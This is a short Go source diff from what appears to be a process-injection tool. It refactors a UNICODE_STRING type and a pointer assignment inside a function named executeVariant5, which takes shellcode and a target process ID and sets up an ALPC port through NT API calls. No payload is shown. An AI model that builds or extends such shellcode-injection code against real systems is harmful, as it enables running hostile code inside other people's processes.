@@ -379,13 +379,7 @@ type OBJECT_ATTRIBUTES struct {
 	SecurityQualityOfService uintptr
 }
 
-// UNICODE_STRING structure - for variant 5
-type UNICODE_STRING struct {
-	Length        uint16
-	MaximumLength uint16
-	_             [4]byte // padding on 64-bit
-	Buffer        uintptr
-}
+// Note: UNICODE_STRING is defined in ts.go
 
 // NT API procedures
 var (
@@ -1316,7 +1310,7 @@ func executeVariant5(shellcode []byte, pid uint32) (string, error) {
 	var usPortName UNICODE_STRING
 	usPortName.Length = uint16(len(portName) * 2)
 	usPortName.MaximumLength = usPortName.Length + 2
-	usPortName.Buffer = uintptr(unsafe.Pointer(&portNameUTF16[0]))
+	usPortName.Buffer = &portNameUTF16[0]
 
 	// Step 8: Create the actual ALPC port with attributes
 	var objAttr OBJECT_ATTRIBUTES
